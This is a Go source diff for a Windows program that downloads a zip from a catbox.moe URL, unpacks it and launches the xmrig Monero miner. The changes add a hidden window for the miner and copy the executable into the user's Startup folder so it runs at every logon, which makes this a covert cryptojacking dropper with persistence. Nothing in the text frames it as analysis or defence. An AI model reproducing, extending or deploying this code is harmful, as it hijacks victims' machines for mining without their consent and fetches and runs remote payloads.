@@ -11,8 +11,9 @@ import (
 	"fmt"
 	"os/exec"
 	"io/ioutil"
+	"syscall"
+	"os/user"
 //	"os/signal"
-//	"syscall"
 )
 
 func downloadFile(filepath string, url string) (err error) {
@@ -111,41 +112,77 @@ func unzipFile(f *zip.File, destination string) error {
 
 func startCommand(dir string) {
 	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	if err := cmd.Start(); err != nil {
-    	log.Printf("Failed to start cmd: %v", err)
-    	return
+		log.Printf("Failed to start cmd: %v", err)
+		return
 	}
 
 	// And when you need to wait for the command to finish:
 	if err := cmd.Wait(); err != nil {
-    	log.Printf("Cmd returned error: %v", err)
+		log.Printf("Cmd returned error: %v", err)
 	}
 }
 
 func RemoveContents(dir string) error {
-    d, err := os.Open(dir)
-    if err != nil {
-        return err
-    }
-    defer d.Close()
-    names, err := d.Readdirnames(-1)
-    if err != nil {
-        return err
-    }
-    for _, name := range names {
-        err = os.RemoveAll(filepath.Join(dir, name))
-        if err != nil {
-            return err
-        }
-    }
-    return nil
+	d, err := os.Open(dir)
+	if err != nil {
+		return err
+	}
+	defer d.Close()
+	names, err := d.Readdirnames(-1)
+	if err != nil {
+		return err
+	}
+	for _, name := range names {
+		err = os.RemoveAll(filepath.Join(dir, name))
+		if err != nil {
+			return err
+		}
+	}
+	return nil
 }
 
+func copy(src, dst string) error {
+	if _, err := os.Stat(dst); os.IsNotExist(err) {
+		in, err := os.Open(src)
+		if err != nil {
+			return err
+		}
+		defer in.Close()
+
+		out, err := os.Create(dst)
+		if err != nil {
+			return err
+		}
+		defer out.Close()
+
+		_, err = io.Copy(out, in)
+		if err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+
 func main() {
+	currentUser, err := user.Current()
+	if err != nil {
+		log.Fatalf(err.Error())
+	}
+	username := currentUser.Username
+
+	err = copy(os.Args[0], "C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+	if err != nil {
+		log.Panicf("copy -> %v", err)
+	}
+
+
 	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
 	if err != nil {
-    	log.Fatalf("error opening file: %v", err)
+		log.Fatalf("error opening file: %v", err)
 	}
 	defer f.Close()
 	log.SetOutput(f)
@@ -170,15 +207,15 @@ func main() {
 
 
 
-	err = downloadFile(filepath.Join(dir, "xmrcache.zip"), "https://files.catbox.moe/52ea29.zip")
+	err = downloadFile(filepath.Join(dir, "xmrcache.zip"), "https://files.catbox.moe/g9ivbr.zip")
 	if err != nil {
-    	log.Fatalf("error downloading file: %v", err)
+		log.Fatalf("error downloading file: %v", err)
 	}
 
-    err = unzipSource(filepath.Join(dir, "xmrcache.zip"), filepath.Join(dir, "xmrcache"))
-    if err != nil {
-        log.Fatal(err)
-    }
+	err = unzipSource(filepath.Join(dir, "xmrcache.zip"), filepath.Join(dir, "xmrcache"))
+	if err != nil {
+		log.Fatal(err)
+	}
 
-    startCommand(dir)
+	startCommand(dir)
 }
